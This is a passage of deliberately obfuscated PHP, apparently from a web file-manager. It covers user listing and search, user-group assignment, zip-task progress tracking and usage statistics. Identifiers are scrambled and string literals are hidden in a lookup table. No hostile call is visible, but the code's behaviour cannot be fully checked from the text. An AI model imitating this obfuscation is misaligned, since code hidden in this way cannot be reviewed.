isset($¬²ö¥ßÇ[$ªÖºğ–]) ? $¬²ö¥ßÇ[$ªÖºğ–] : 0; $ªÖºğ–++; $ï¿±ÜôĞ[] = $Ê‘æ‰´; } return $æĞ­˜º¥->addAll($ï¿±ÜôĞ, array(), !0); } protected function userGroupAdd($ï®¿’å, $Ù—¿ñ½¡ = array()) { $Í“’•“ç =& $_SERVER[ˆö¿ÚÌ¼]; $†ÓŸŒ‚ = $this->getInfoSimple($ï®¿’å); if (!$†ÓŸŒ‚ || empty($Ù—¿ñ½¡)) { return !1; } $‚Åñ™ŸÅ = array(); foreach ($Ù—¿ñ½¡ as $¡Ü¼…¦¿ => $‡”ÂÜ¡) { $‚Åñ™ŸÅ[] = array($Í“’•“ç[1785] => $ï®¿’å, $Í“’•“ç[1986] => $¡Ü¼…¦¿, $Í“’•“ç[2094] => $‡”ÂÜ¡, $Í“’•“ç[2010] => 0); } return Model($Í“’•“ç[2080])->addAll($‚Åñ™ŸÅ, array(), !0); } protected function userGroupRemove($µ™ùœ’Ú, $ƒş´™·) { $Òè’  =& $_SERVER[ˆö¿ÚÌ¼]; $“Ñòı›Ó = $this->getInfoSimple($µ™ùœ’Ú); if (!$“Ñòı›Ó || !$ƒş´™·) { return !1; } $ááÊŠéì = array($Òè’ [1776] => $µ™ùœ’Ú, $Òè’ [2078] => $ƒş´™·); return Model($Òè’ [2080])->where($ááÊŠéì)->delete(); } public function listData() { $ÅÎŸŠ“š = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÅÎŸŠ“š[$_SERVER[ˆö¿ÚÌ¼][448]]); return $ÅÎŸŠ“š; } public function listByID($Ä¥ ÌÊÑ) { $™ßÇöêÒ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Ä¥ ÌÊÑ) { return; } $ëòãÁ = array($™ßÇöêÒ[1785] => array($™ßÇöêÒ[7], $Ä¥ ÌÊÑ)); $ò¾èÃ = $this->where($ëòãÁ)->select(); $ò¾èÃ = array_sort_keep($ò¾èÃ, $™ßÇöêÒ[1785], $Ä¥ ÌÊÑ); $this->_listDataApply($ò¾èÃ); return $ò¾èÃ; } public function listByGroup($Á‹ï†ò = 0, $ªøØÊö = array()) { $È…³‘¼ =& $_SERVER[ˆö¿ÚÌ¼]; $ŸÄ³üü  = $È…³‘¼[12]; $İëù¨µú = array(); if ($Á‹ï†ò) { $İëù¨µú = array($È…³‘¼[2521] => intval($Á‹ï†ò)); $ŸÄ³üü  = "\114\x45\106\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\137\147\162\157\x75\x70\40\x75\x73\145\162\x5f\147\x72\157\x75\x70\x20\x6f\156\40\x75\x73\145\x72\x2e\165\163\145\162\111\x44\x20\75\x20\165\x73\x65\x72\x5f\147\162\157\x75\160\56\x75\163\145\162\111\x44"; $„¤Å¤î­ = Input::get($È…³‘¼[542], null, $È…³‘¼[12]) ? $È…³‘¼[12] : $È…³‘¼[2522]; } if (isset($ªøØÊö[$È…³‘¼[835]])) { $İëù¨µú[$È…³‘¼[2523]] = $ªøØÊö[$È…³‘¼[835]]; } $æÈóğ = _get($ªøØÊö, $È…³‘¼[2524], $È…³‘¼[234]); if (_get($ªøØÊö, $È…³‘¼[845], !1)) { $İëù¨µú[$æÈóğ] = array($È…³‘¼[2266], $ªøØÊö[$È…³‘¼[845]]); } if (_get($ªøØÊö, $È…³‘¼[846], !1)) { $±ü››µê = array($È…³‘¼[2267], $ªøØÊö[$È…³‘¼[846]]); if ($İëù¨µú[$æÈóğ]) { $İëù¨µú[$æÈóğ] = array($İëù¨µú[$æÈóğ], $±ü››µê, $È…³‘¼[2268]); } else { $İëù¨µú[$æÈóğ] = $±ü››µê; } } $Ì¤ê“·› = $this->_makeOrder($„¤Å¤î­)->field($È…³‘¼[2525])->where($İëù¨µú)->join($ŸÄ³üü )->selectPage(50); $this->_listDataApply($Ì¤ê“·›[$È…³‘¼[448]]); return $Ì¤ê“·›; } private function _makeOrder($–ˆúŠ°œ = '') { $´âª×çŸ =& $_SERVER[ˆö¿ÚÌ¼]; $ñ¡œŒ¡ë = array($´âª×çŸ[1785], $´âª×çŸ[32], $´âª×çŸ[1974], $´âª×çŸ[2196], $´âª×çŸ[1946], $´âª×çŸ[234]); $ˆ æ ı¿ = array($´âª×çŸ[535] => $´âª×çŸ[536], $´âª×çŸ[537] => $´âª×çŸ[538]); $ïŸÎÓäĞ = Input::get($´âª×çŸ[542], $´âª×çŸ[7], $´âª×çŸ[1776], $ñ¡œŒ¡ë); $¸ù÷ë¿‰ = Input::get($´âª×çŸ[543], $´âª×çŸ[7], $´âª×çŸ[2081], array($´âª×çŸ[2081], $´âª×çŸ[537])); $¸ù÷ë¿‰ = $ˆ æ ı¿[$¸ù÷ë¿‰]; $–ˆúŠ°œ = $–ˆúŠ°œ . "\x75\163\145\162\x2e{$ïŸÎÓäĞ}\40{$¸ù÷ë¿‰}\x2c\x20\165\x73\x65\x72\56\165\163\145\x72\x49\x44\40\x61\x73\143"; return $this->alias($´âª×çŸ[2212])->order($–ˆúŠ°œ); } public function listSearch($¸ ŸÆ¶Â) { $Ü¶üšö÷ =& $_SERVER[ˆö¿ÚÌ¼]; $ÁâÂ‹ = trim($¸ ŸÆ¶Â[$Ü¶üšö÷[2084]]); $Óé‰™¥ = explode($Ü¶üšö÷[53], $ÁâÂ‹); if (!$ÁâÂ‹ || count($Óé‰™¥) == 1) { return $this->listSearchNow($¸ ŸÆ¶Â); } $¬¥åü±ç = array($Ü¶üšö÷[448] => array()); foreach ($Óé‰™¥ as $®åÇäçÇ) { if (!trim($®åÇäçÇ)) { continue; } $¸ ŸÆ¶Â[$Ü¶üšö÷[2084]] = $®åÇäçÇ; $´ä°Š˜Ì = $this->listSearchNow($¸ ŸÆ¶Â); $¬¥åü±ç[$Ü¶üšö÷[448]] = array_merge($¬¥åü±ç[$Ü¶üšö÷[448]], $´ä°Š˜Ì[$Ü¶üšö÷[448]]); } $¬¥åü±ç[$Ü¶üšö÷[448]] = array_unique_by_key($¬¥åü±ç[$Ü¶üšö÷[448]], $Ü¶üšö÷[1785]); $¬¥åü±ç[$Ü¶üšö÷[445]] = array($Ü¶üšö÷[446] => count($¬¥åü±ç[$Ü¶üšö÷[448]]), $Ü¶üšö÷[442] => 20, $Ü¶üšö÷[431] => 1, $Ü¶üšö÷[447] => 1); return $¬¥åü±ç; } public function listSearchNow($—Ë€Çâä) { $¤™ñÈÅ³ =& $_SERVER[ˆö¿ÚÌ¼]; $ß²Çšô = trim($—Ë€Çâä[$¤™ñÈÅ³[2084]]); $«îé¦« = isset($—Ë€Çâä[$¤™ñÈÅ³[2085]]) ? $—Ë€Çâä[$¤™ñÈÅ³[2085]] : !1; $ß²Çšô = str_replace($¤™ñÈÅ³[2086], $¤™ñÈÅ³[2087], trim($ß²Çšô)); $µº˜µ¥ó = array($¤™ñÈÅ³[32] => array($¤™ñÈÅ³[462], "\45{$ß²Çšô}\x25"), $¤™ñÈÅ³[383] => array($¤™ñÈÅ³[462], "{$ß²Çšô}\45"), $¤™ñÈÅ³[2285] => array($¤™ñÈÅ³[462], "{$ß²Çšô}\45"), $¤™ñÈÅ³[1091] => $¤™ñÈÅ³[2088]); if (Input::check($ß²Çšô, $¤™ñÈÅ³[389])) { $µº˜µ¥ó[$¤™ñÈÅ³[1785]] = array($¤™ñÈÅ³[462], "{$ß²Çšô}\x25"); $µº˜µ¥ó[$¤™ñÈÅ³[2506]] = array($¤™ñÈÅ³[462], "{$ß²Çšô}\45"); } if (!$ß²Çšô) { $µº˜µ¥ó = array(); } if (isset($—Ë€Çâä[$¤™ñÈÅ³[835]])) { $µº˜µ¥ó[$¤™ñÈÅ³[835]] = $—Ë€Çâä[$¤™ñÈÅ³[835]]; } $µº˜µ¥ó = $this->parseWhereLike($µº˜µ¥ó); $§àõşÍî = $this->_makeOrder()->where($µº˜µ¥ó)->selectPage(20); if (!$§àõşÍî || count($§àõşÍî[$¤™ñÈÅ³[448]]) < 5 && Input::check($ß²Çšô, $¤™ñÈÅ³[396])) { $¬¹ÇğÏë = $this->_searchFromMeta($¤™ñÈÅ³[549], $ß²Çšô, 10); $ÚØ¶£­ë = $this->_searchFromMeta($¤™ñÈÅ³[550], $ß²Çšô, 10); $¨ºˆ›¯ğ = array_merge($¬¹ÇğÏë, $ÚØ¶£­ë, $§àõşÍî[$¤™ñÈÅ³[448]]); $§àõşÍî[$¤™ñÈÅ³[448]] = array_unique_by_key($¨ºˆ›¯ğ, $¤™ñÈÅ³[1785]); $§àõşÍî[$¤™ñÈÅ³[445]][$¤™ñÈÅ³[446]] = count($§àõşÍî[$¤™ñÈÅ³[448]]); $§àõşÍî[$¤™ñÈÅ³[445]][$¤™ñÈÅ³[447]] = ceil($§àõşÍî[$¤™ñÈÅ³[445]][$¤™ñÈÅ³[446]] / $§àõşÍî[$¤™ñÈÅ³[445]][$¤™ñÈÅ³[442]]); } $this->_listDataApply($§àõşÍî[$¤™ñÈÅ³[448]]); $this->_filterByGroup($§àõşÍî, $«îé¦«); return $§àõşÍî; } private function _filterByGroup(&$Ó÷âÌ°Ñ, $ï£‡Õ) { $§ö¨Ò¯ñ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ï£‡Õ) { return $Ó÷âÌ°Ñ; } foreach ($Ó÷âÌ°Ñ[$§ö¨Ò¯ñ[448]] as $Ùë¼ğÏØ => &$·ø§Ï¡¶) { $ıŞŠ¯åÂ = array_to_keyvalue($·ø§Ï¡¶[$§ö¨Ò¯ñ[2181]], $§ö¨Ò¯ñ[12], $§ö¨Ò¯ñ[1986]); if (!in_array($ï£‡Õ, $ıŞŠ¯åÂ)) { unset($Ó÷âÌ°Ñ[$§ö¨Ò¯ñ[448]][$Ùë¼ğÏØ]); } } unset($·ø§Ï¡¶); $Ó÷âÌ°Ñ[$§ö¨Ò¯ñ[448]] = array_values($Ó÷âÌ°Ñ[$§ö¨Ò¯ñ[448]]); $Ó÷âÌ°Ñ[$§ö¨Ò¯ñ[445]] = array($§ö¨Ò¯ñ[2249] => count($Ó÷âÌ°Ñ[$§ö¨Ò¯ñ[448]]), $§ö¨Ò¯ñ[2247] => $Ó÷âÌ°Ñ[$§ö¨Ò¯ñ[445]][$§ö¨Ò¯ñ[442]], $§ö¨Ò¯ñ[2246] => 1, $§ö¨Ò¯ñ[2248] => 1); } private function _searchFromMeta($Øê•‹ä, $ƒÕšÆ¢, $ÈáûŸ¦Û) { $Ù¿›Á‰ =& $_SERVER[ˆö¿ÚÌ¼]; $ƒÕšÆ¢ = strtolower($ƒÕšÆ¢); $©ÊÌı‘³ = array($Ù¿›Á‰[97] => $Øê•‹ä, $Ù¿›Á‰[453] => array($Ù¿›Á‰[462], "\x25{$ƒÕšÆ¢}\45")); $©ÊÌı‘³ = $this->parseWhereLike($©ÊÌı‘³); $…ñÒãï = Model($Ù¿›Á‰[2526])->where($©ÊÌı‘³)->limit($ÈáûŸ¦Û)->select(); if (!$…ñÒãï) { return array(); } $…ñÒãï = array_to_keyvalue($…ñÒãï, $Ù¿›Á‰[12], $Ù¿›Á‰[1785]); $Êİ¹ıİƒ = $this->where(array($Ù¿›Á‰[1776] => array($Ù¿›Á‰[7], $…ñÒãï)))->select(); if (!$Êİ¹ıİƒ) { return array(); } return $Êİ¹ıİƒ; } private function _listDataApplyItem($Û…øªÑ©) { $Ø©Í•éô = array($Û…øªÑ©); $this->_listDataApply($Ø©Í•éô); return $Ø©Í•éô[0]; } private function _listDataApply(&$ˆë¥™Û›) { $öê‘ï¯Ø =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ˆë¥™Û›) { return; } array_remove_key($ˆë¥™Û›, $öê‘ï¯Ø[980]); $è§²¸ş = array_to_keyvalue($ˆë¥™Û›, $öê‘ï¯Ø[12], $öê‘ï¯Ø[1785]); $this->_listAppendGroup($ˆë¥™Û›, $è§²¸ş); $this->_listAppendMeta($ˆë¥™Û›, $è§²¸ş); $this->_listAppendSourceRoot($ˆë¥™Û›, $è§²¸ş); } private function _listAppendSourceRoot(&$¥É‹Š®Ç, $¢ÍÍßšİ) { $°úüå¢Š =& $_SERVER[ˆö¿ÚÌ¼]; $´ÂåÆåÙ = Model($°úüå¢Š[915])->listSourceRoot(SourceModel::TYPE_USER, $¢ÍÍßšİ); $´ÂåÆåÙ = array_to_keyvalue($´ÂåÆåÙ, $°úüå¢Š[583]); $´ÂåÆåÙ = array_remove_key($´ÂåÆåÙ, $°úüå¢Š[583]); foreach ($¥É‹Š®Ç as &$£ˆúè·) { $£ˆúè·[$°úüå¢Š[90]] = $´ÂåÆåÙ[$£ˆúè·[$°úüå¢Š[1785]]] ? $´ÂåÆåÙ[$£ˆúè·[$°úüå¢Š[1785]]] : array(); } unset($£ˆúè·); } private function _listAppendGroup(&$£İ¡˜ÜÓ, $öºÏä³—) { $ª„¤„¬× =& $_SERVER[ˆö¿ÚÌ¼]; $úû¾öî° = array($ª„¤„¬×[1785] => array($ª„¤„¬×[7], $öºÏä³—)); $¢İ‚òÆ = Model($ª„¤„¬×[2080])->where($úû¾öî°)->select(); $†á†ÒÉ´ = array_to_keyvalue($¢İ‚òÆ, $ª„¤„¬×[12], $ª„¤„¬×[1986]); $†á†ÒÉ´ = array_remove_value(array_unique($†á†ÒÉ´), $ª„¤„¬×[231]); if (!$†á†ÒÉ´ || !$¢İ‚òÆ) { return; } $úû¾öî° = array($ª„¤„¬×[1986] => array($ª„¤„¬×[7], $†á†ÒÉ´)); $öÜ¥íƒ¢ = Model($ª„¤„¬×[2179])->field($ª„¤„¬×[2527])->where($úû¾öî°)->select(); $öÜ¥íƒ¢ = array_to_keyvalue($öÜ¥íƒ¢, $ª„¤„¬×[1986]); $¢İ‚òÆ = array_to_keyvalue_group($¢İ‚òÆ, $ª„¤„¬×[1785]); foreach ($¢İ‚òÆ as &$¨Ê³ÇíÓ) { $‡‹û÷¼£ = array(); foreach ($¨Ê³ÇíÓ as $öÈŒÓ°€) { if (!$öÈŒÓ°€[$ª„¤„¬×[2094]]) { continue; } $Ôõè– = Model($ª„¤„¬×[585])->listData($öÈŒÓ°€[$ª„¤„¬×[2094]]); $‡‹û÷¼£[] = array($ª„¤„¬×[1986] => $öÈŒÓ°€[$ª„¤„¬×[1986]], $ª„¤„¬×[2528] => $öÜ¥íƒ¢[$öÈŒÓ°€[$ª„¤„¬×[1986]]][$ª„¤„¬×[32]], $ª„¤„¬×[598] => $öÜ¥íƒ¢[$öÈŒÓ°€[$ª„¤„¬×[1986]]][$ª„¤„¬×[598]], $ª„¤„¬×[499] => $Ôõè–); } $¨Ê³ÇíÓ = $‡‹û÷¼£; } unset($¨Ê³ÇíÓ); foreach ($£İ¡˜ÜÓ as &$„£É¯ë°) { $„£É¯ë°[$ª„¤„¬×[2181]] = array(); if (isset($¢İ‚òÆ[$„£É¯ë°[$ª„¤„¬×[1785]]])) { $„£É¯ë°[$ª„¤„¬×[2181]] = $¢İ‚òÆ[$„£É¯ë°[$ª„¤„¬×[1785]]]; } } unset($„£É¯ë°); } public function userAppendGroup($†ù¿ŞÔö) { $£ßø«š¦ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$†ù¿ŞÔö) { return array(); } $this->_listAppendGroup($†ù¿ŞÔö, array_to_keyvalue($†ù¿ŞÔö, $£ßø«š¦[12], $£ßø«š¦[1785])); return $†ù¿ŞÔö; } private function _listAppendMeta(&$«À£âÁÖ, $›€ƒûÓÀ) { $ÚüÛè¯ë =& $_SERVER[ˆö¿ÚÌ¼]; $ÀÉÆªñ¯ = UserJobModel::JOB_KEY; $ôêÍ×ñø = array($ÚüÛè¯ë[2507]); $¿±ª´´ = array($ÚüÛè¯ë[1785] => array($ÚüÛè¯ë[7], $›€ƒûÓÀ)); $³™çŒş = Model($ÚüÛè¯ë[2505])->where($¿±ª´´)->select(); $³™çŒş = array_to_keyvalue_group($³™çŒş, $ÚüÛè¯ë[1785]); foreach ($³™çŒş as &$èàÖ…Îı) { $áê°ºµ° = array(); foreach ($èàÖ…Îı as $­Èë‚“) { if (!in_array($­Èë‚“[$ÚüÛè¯ë[97]], $ôêÍ×ñø)) { $áê°ºµ°[$­Èë‚“[$ÚüÛè¯ë[97]]] = $­Èë‚“[$ÚüÛè¯ë[453]]; } } $èàÖ…Îı = $áê°ºµ°; } unset($èàÖ…Îı); $â—ıŠÌš = Model($ÚüÛè¯ë[2529]); foreach ($«À£âÁÖ as &$Öæ‚¢¢) { $ÕÖ‘ó•¤ = array(); if (isset($³™çŒş[$Öæ‚¢¢[$ÚüÛè¯ë[1785]]])) { $ÕÖ‘ó•¤ = $³™çŒş[$Öæ‚¢¢[$ÚüÛè¯ë[1785]]]; } $Öæ‚¢¢[$ÚüÛè¯ë[2530]] = array(); if (isset($ÕÖ‘ó•¤[$ÀÉÆªñ¯])) { $Öæ‚¢¢[$ÚüÛè¯ë[2530]] = $â—ıŠÌš->getUserJobInfo($ÕÖ‘ó•¤[$ÀÉÆªñ¯]); } } unset($Öæ‚¢¢); } protected function groupUserAll($·¼™†„) { $¹§— =& $_SERVER[ˆö¿ÚÌ¼]; if (!$·¼™†„) { return !1; } $Ÿó‹‘ùÆ = Model($¹§—[2080])->field($¹§—[1785])->where(array($¹§—[1986] => array($¹§—[7], $·¼™†„)))->select(); $Ÿó‹‘ùÆ = array_to_keyvalue($Ÿó‹‘ùÆ, $¹§—[12], $¹§—[1785]); return array_unique($Ÿó‹‘ùÆ); } public function userSearch($ìš’íá˜, $×½š¹½‡ = "\52") { return Model($_SERVER[ˆö¿ÚÌ¼][611])->where($ìš’íá˜)->field($×½š¹½‡)->find(); } } goto e³ö‹ØÎ˜; e×ÊÚ¸¸¦ß: class TaskZip extends TaskFileTransfer { protected function startAfter() { $­´ş´¸ø =& $_SERVER[ˆö¿ÚÌ¼]; parent::startAfter(); Hook::bind($­´ş´¸ø[1911], array($this, $­´ş´¸ø[1901])); Hook::bind($­´ş´¸ø[1903], array($this, $­´ş´¸ø[1904])); $ùşÕË¯ö =& $this->task; $ùşÕË¯ö[$­´ş´¸ø[1905]] = $­´ş´¸ø[1293]; if (!$ùşÕË¯ö[$­´ş´¸ø[1673]]) { $ùşÕË¯ö[$­´ş´¸ø[1673]] = LNG($­´ş´¸ø[1912]); } } protected function endAfter() { $«ï–¾Ë =& $_SERVER[ˆö¿ÚÌ¼]; parent::endAfter(); Hook::unbind($«ï–¾Ë[1911], array($this, $«ï–¾Ë[1901])); Hook::unbind($«ï–¾Ë[1903], array($this, $«ï–¾Ë[1904])); } public function updateAfter() { $¹®í²áù =& $_SERVER[ˆö¿ÚÌ¼]; $®°£ĞÓ =& $this->task; if (!$®°£ĞÓ[$¹®í²áù[1154]] || !$®°£ĞÓ[$¹®í²áù[848]]) { return; } if ($®°£ĞÓ[$¹®í²áù[1905]] == $¹®í²áù[1293]) { $Ğ¯ˆÆ’Å = $®°£ĞÓ[$¹®í²áù[1840]]; if ($®°£ĞÓ[$¹®í²áù[1841]] != $¹®í²áù[1293]) { $Ğ¯ˆÆ’Å = 0; } $”±úå‰º = ($®°£ĞÓ[$¹®í²áù[1844]] + $Ğ¯ˆÆ’Å) / $®°£ĞÓ[$¹®í²áù[848]]; $®°£ĞÓ[$¹®í²áù[1787]] = $”±úå‰º * 0.3; } else { if ($®°£ĞÓ[$¹®í²áù[1905]] == $¹®í²áù[391]) { $”±úå‰º = $®°£ĞÓ[$¹®í²áù[1786]] / $®°£ĞÓ[$¹®í²áù[1154]]; $®°£ĞÓ[$¹®í²áù[1787]] = 0.3 + $”±úå‰º * 0.5; } else { if ($®°£ĞÓ[$¹®í²áù[1905]] == $¹®í²áù[110]) { $”±úå‰º = 0; if ($®°£ĞÓ[$¹®í²áù[1839]]) { $”±úå‰º = $®°£ĞÓ[$¹®í²áù[1840]] / $®°£ĞÓ[$¹®í²áù[1839]]; } $®°£ĞÓ[$¹®í²áù[1787]] = 0.3 + 0.5 + $”±úå‰º * 0.2; } } } if ($®°£ĞÓ[$¹®í²áù[1787]] > 0) { $šƒøã¯ã = timeFloat() - $®°£ĞÓ[$¹®í²áù[1789]] - $®°£ĞÓ[$¹®í²áù[1792]]; $®°£ĞÓ[$¹®í²áù[1793]] = $šƒøã¯ã * (1 - $®°£ĞÓ[$¹®í²áù[1787]]) / $®°£ĞÓ[$¹®í²áù[1787]]; } } public function copyFileStart($Ì…°‰ú, $ƒ‹Æú, $˜Ïûº·ã, $Ò­àçÜŸ, $¥£ğÀøÂ, $ÒÂ†„Ï) { $ˆ®À·õ =& $_SERVER[ˆö¿ÚÌ¼]; parent::copyFileStart($Ì…°‰ú, $ƒ‹Æú, $˜Ïûº·ã, $Ò­àçÜŸ, $¥£ğÀøÂ, $ÒÂ†„Ï); $¿¢¸¸†§ =& $this->task; if ($¿¢¸¸†§[$ˆ®À·õ[1905]] == $ˆ®À·õ[391]) { $¿¢¸¸†§[$ˆ®À·õ[1905]] = $ˆ®À·õ[110]; } $this->update(); } public function copyFileEnd($ æ£ô¥Ø, $‰ ı‹À», $‹µŠİ ü, $¦ØÛèŸ, $š¦ş´şß, $¢‹áˆ›) { $“¹ó†¹ =& $_SERVER[ˆö¿ÚÌ¼]; $æßÕî¿ä =& $this->task; $æßÕî¿ä[$“¹ó†¹[1840]] = $æßÕî¿ä[$“¹ó†¹[1839]]; $æßÕî¿ä[$“¹ó†¹[1844]] += $æßÕî¿ä[$“¹ó†¹[1839]]; $æßÕî¿ä[$“¹ó†¹[1841]] = $“¹ó†¹[12]; $this->update(); } public function zipEvent($¼¶¦‡ùê, $šó¡Ê²ı, $ìÌ»ÈÛœ, $å¯óÍŒû) { $É˜ªŞºÄ =& $_SERVER[ˆö¿ÚÌ¼]; $ıÎ„ÀÍ× =& $this->task; $ıÎ„ÀÍ×[$É˜ªŞºÄ[1837]] = get_path_this($šó¡Ê²ı); $ıÎ„ÀÍ×[$É˜ªŞºÄ[1839]] = $å¯óÍŒû; $ıÎ„ÀÍ×[$É˜ªŞºÄ[1840]] = $ìÌ»ÈÛœ; $ıÎ„ÀÍ×[$É˜ªŞºÄ[1156]] = $¼¶¦‡ùê == $É˜ªŞºÄ[1913] ? $É˜ªŞºÄ[1908] : $É˜ªŞºÄ[1909]; $ıÎ„ÀÍ×[$É˜ªŞºÄ[1841]] = $É˜ªŞºÄ[12]; $ıÎ„ÀÍ×[$É˜ªŞºÄ[848]] = $å¯óÍŒû; $ıÎ„ÀÍ×[$É˜ªŞºÄ[1905]] = $É˜ªŞºÄ[391]; $this->update(); } public function nameParse($‚óÒç°­) { $Ç¯³ÀÄ =& $_SERVER[ˆö¿ÚÌ¼]; $÷Š»ß¬± =& $this->task; if ($÷Š»ß¬±[$Ç¯³ÀÄ[1786]] < $÷Š»ß¬±[$Ç¯³ÀÄ[1154]]) { $šãÕÈç = get_path_this($‚óÒç°­); if (strstr($šãÕÈç, $Ç¯³ÀÄ[10])) { $÷Š»ß¬±[$Ç¯³ÀÄ[1786]] += 1; } } if ($÷Š»ß¬±[$Ç¯³ÀÄ[1905]] == $Ç¯³ÀÄ[1293]) { $÷Š»ß¬±[$Ç¯³ÀÄ[1905]] = $Ç¯³ÀÄ[391]; } $÷Š»ß¬±[$Ç¯³ÀÄ[1837]] = $‚óÒç°­; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ù´Ùñ¬) { $‘Â¶ãà× =& $_SERVER[ˆö¿ÚÌ¼]; $†¡³¿Åä = array($‘Â¶ãà×[679] => array($‘Â¶ãà×[33] => $‘Â¶ãà×[1914], $‘Â¶ãà×[353] => array($‘Â¶ãà×[285], $‘Â¶ãà×[850], $‘Â¶ãà×[1915], $‘Â¶ãà×[1916])), $‘Â¶ãà×[1917] => array($‘Â¶ãà×[33] => $‘Â¶ãà×[1918], $‘Â¶ãà×[353] => array($‘Â¶ãà×[285], $‘Â¶ãà×[848], $‘Â¶ãà×[1919], $‘Â¶ãà×[1920], $‘Â¶ãà×[1921]))); if (!isset($†¡³¿Åä[$Ù´Ùñ¬])) { return !1; } $this->optionType = $†¡³¿Åä[$Ù´Ùñ¬][$‘Â¶ãà×[33]]; $this->field = $†¡³¿Åä[$Ù´Ùñ¬][$‘Â¶ãà×[353]]; return !0; } public function listData($Ä²©É® = false, $¥ûÄ±„— = "\155\x6f\x64\151\x66\x79\x54\x69\155\145", $¸âùÄÜ¬ = false) { return parent::listData($Ä²©É®, $¥ûÄ±„—, $¸âùÄÜ¬); } public function trendList($Á¯Ì¤ß) { $£¤Í¶™ƒ =& $_SERVER[ˆö¿ÚÌ¼]; $®…åÈ‚ = $this->listData(); if ($®…åÈ‚) { $…øò†ş = end($®…åÈ‚); $ÙÇ‘Ú = date($£¤Í¶™ƒ[1922], strtotime($£¤Í¶™ƒ[1923])); if ($…øò†ş[$£¤Í¶™ƒ[285]] == $ÙÇ‘Ú) { return $®…åÈ‚; } $¾ä«¤á = strtotime($…øò†ş[$£¤Í¶™ƒ[285]]); } if (!isset($¾ä«¤á)) { $²ÑÏÃïÔ = $Á¯Ì¤ß == $£¤Í¶™ƒ[679] ? $£¤Í¶™ƒ[611] : $£¤Í¶™ƒ[915]; $¾ä«¤á = Model($²ÑÏÃïÔ)->min($£¤Í¶™ƒ[234]); } $¬™Ìáñã = $£¤Í¶™ƒ[1924] . ucfirst($Á¯Ì¤ß); $ÑùªËÅ‘ = $this->dateList($¾ä«¤á); foreach ($ÑùªËÅ‘ as $ÙÇ‘Ú) { $this->{$¬™Ìáñã}($ÙÇ‘Ú); } return $this->listData(); } private function dateList($ğÔïÊÍã) { $ÖÁÖüáŒ =& $_SERVER[ˆö¿ÚÌ¼]; $ÜíªáóÒ = $ğÔïÊÍã; $¥àšÏ€Ô = strtotime($ÖÁÖüáŒ[1923]); $…íïØº“ = array(); while ($ÜíªáóÒ <= $¥àšÏ€Ô) { $…íïØº“[] = date($ÖÁÖüáŒ[1922], $ÜíªáóÒ); $ÜíªáóÒ = strtotime($ÖÁÖüáŒ[1925], $ÜíªáóÒ); } return $…íïØº“; } public function _recordUser($ë¼ü®» = '') { $ËÃéñî =& $_SERVER[ˆö¿ÚÌ¼]; $ÇÌç—• = strtotime(date($ËÃéñî[1926], strtotime($ë¼ü®»))); $åÆº…Ü¢ = strtotime(date($ËÃéñî[1927], strtotime($ë¼ü®»))); $”²Ö¤ÀÇ = array($ËÃéñî[234] => array($ËÃéñî[1104], $åÆº…Ü¢)); $Ç„ÌËî = Model($ËÃéñî[611])->where($”²Ö¤ÀÇ)->count($ËÃéñî[1785]); $”²Ö¤ÀÇ[$ËÃéñî[234]] = array($ËÃéñî[411], array($ÇÌç—•, $åÆº…Ü¢)); $éÎ¶ª—‡ = Model($ËÃéñî[611])->where($”²Ö¤ÀÇ)->count($ËÃéñî[1785]); $”²Ö¤ÀÇ[$ËÃéñî[33]] = $ËÃéñî[1928]; $öáÔÆ‡ú = Model($ËÃéñî[1929])->where($”²Ö¤ÀÇ)->count($ËÃéñî[1930]); $Ìşì“Ÿæ = array($ËÃéñî[285] => $ë¼ü®», $ËÃéñî[850] => (int) $Ç„ÌËî, $ËÃéñî[1915] => (int) $éÎ¶ª—‡, $ËÃéñî[1916] => (int) $öáÔÆ‡ú); return $this->insert($Ìşì“Ÿæ); } public function _recordStore($äß¤ÍÄô = '') { $“¼©” ø =& $_SERVER[ˆö¿ÚÌ¼]; $œ¹Î¿« = strtotime(date($“¼©” ø[1927], strtotime($äß¤ÍÄô))); $ô—öã»Ÿ = array($“¼©” ø[234] => array($“¼©” ø[1104], $œ¹Î¿«)); $÷æùäâ€ = Model($“¼©” ø[558])->where($ô—öã»Ÿ)->sum($“¼©” ø[79]); $ô—öã»Ÿ[$“¼©” ø[497]] = 0; $ñ×Îëş = Model($“¼©” ø[915])->where($ô—öã»Ÿ)->sum($“¼©” ø[79]); $ô—öã»Ÿ[$“¼©” ø[191]] = 1; $äî®ò³ï = Model($“¼©” ø[915])->where($ô—öã»Ÿ)->sum($“¼©” ø[79]); $ô—öã»Ÿ[$“¼©” ø[191]] = 2; $Àµ£€ü¿ = Model($“¼©” ø[915])->where($ô—öã»Ÿ)->sum($“¼©” ø[79]); $ÅøšÔüÖ = array($“¼©” ø[285] => $äß¤ÍÄô, $“¼©” ø[848] => (int) $ñ×Îëş, $“¼©” ø[1919] => (int) $÷æùäâ€, $“¼©” ø[1920] => (int) $äî®ò³ï, $“¼©” ø[1921] => (int) $Àµ£€ü¿); return $this->insert($ÅøšÔüÖ); } public function trend($ÓŞŒôöŸ, $óÌ‚™’Ç) { $’Ç¼¯â‰ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->init($ÓŞŒôöŸ)) { return !1; } $¤™ùŒŞ´ = $this->trendList($ÓŞŒôöŸ); if ($¤™ùŒŞ´ && $óÌ‚™’Ç != $’Ç¼¯â‰[1757]) { $Šû€îâ¤ = $¤™ùŒŞ´[0][$’Ç¼¯â‰[285]]; $Üä“Çêç = $this->validDate($óÌ‚™’Ç, $Šû€îâ¤); $´ŸØ™Ò« = array(); $¤‘ ŠŞ = array_to_keyvalue($¤™ùŒŞ´, $’Ç¼¯â‰[285]); foreach ($Üä“Çêç as $â„£§) { if (isset($¤‘ ŠŞ[$â„£§])) { $§ç£Òò¨ = $¤‘ ŠŞ[$â„£§]; } else { $§ç£Òò¨ = end($¤™ùŒŞ´); $§ç£Òò¨[$’Ç¼¯â‰[285]] = $â„£§; if ($ÓŞŒôöŸ == $’Ç¼¯â‰[679]) { $§ç£Òò¨[$’Ç¼¯â‰[1915]] = $§ç£Òò¨[$’Ç¼¯â‰[1916]] = 0; } } $´ŸØ™Ò«[] = $§ç£Òò¨; } $¤™ùŒŞ´ = $´ŸØ™Ò«; } 